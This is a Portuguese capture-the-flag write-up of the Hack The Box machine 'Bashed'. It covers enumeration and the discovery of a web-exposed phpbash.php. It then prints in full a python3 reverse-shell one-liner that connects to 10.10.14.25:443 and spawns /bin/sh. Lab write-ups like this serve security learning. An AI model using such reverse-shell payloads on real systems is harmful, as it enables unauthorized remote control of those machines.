---
title:     "Hack The Box - Bashed"
tags: [linux,easy, CVE 2017-6074, CVE 2017-16995, kernel exploit]
categories: Linux
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/1.jpg)

## Enumeration

Iniciamos a enumeracao, usando o autorecon para ganhar tempo...

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/2.jpg)

Em paralelo eu estava olhando o site manualmente, de inicio vc ja encontra algumas dicas sobre a maquina..

Apos isso, fui verificar o output do autorecon e encotrei algumas coisas interessantes

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/3.jpg)

Veja o code de cada dir encontrado, os de `code 308` sao os mais imnportantes, entao precisava verificar cada um deles, ao verificar o `/dev` encontro o que eu estava procurando.. o `phpbash.php` entao ali eu ja tinha um bash em php, eu precisava agora ter uma reverse shell.

## Reverse Shell

Usando a tool [gorevpop](https://github.com/an4kein/gorevpop) que eu criei recentemente usando Go, gerei um payload python3 e em seguida ja estava com uma reverse shell

```
root@kali:~/HTB-Linux/bashed# go run /opt/gorevpop/main.go 19 10.10.14.25 443                                        

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/4.jpg)

